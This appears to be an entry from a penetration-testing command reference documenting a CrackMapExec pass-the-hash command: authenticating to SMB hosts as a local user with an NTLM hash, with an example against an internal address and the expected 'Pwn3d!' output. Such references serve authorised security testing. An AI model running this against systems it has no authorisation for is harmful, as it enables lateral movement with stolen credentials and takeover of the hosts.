---
type: command
executor: bash
data: cme smb $_TARGET -u $_USER -H $_HASH --local-auth
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Linux
tags:
  - smb
  - authentication
verified: true
validated: true
---

# cme-smb-authenticate

## Command

```bash
cme smb $_TARGET -u $_USER -H $_HASH --local-auth
```

## Description

Authenticates to SMB target using hash for local auth.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET | IP or range | Yes |
| -u $_USER | Username | Yes |
| -H $_HASH | NTLM hash | Yes |
| --local-auth | Local auth mode | Yes |

## Examples

### Basic Usage

```bash
cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
```

## Expected Output

"Pwn3d!" or auth status per host.

## Related

- [[tools/CrackMapExec]]
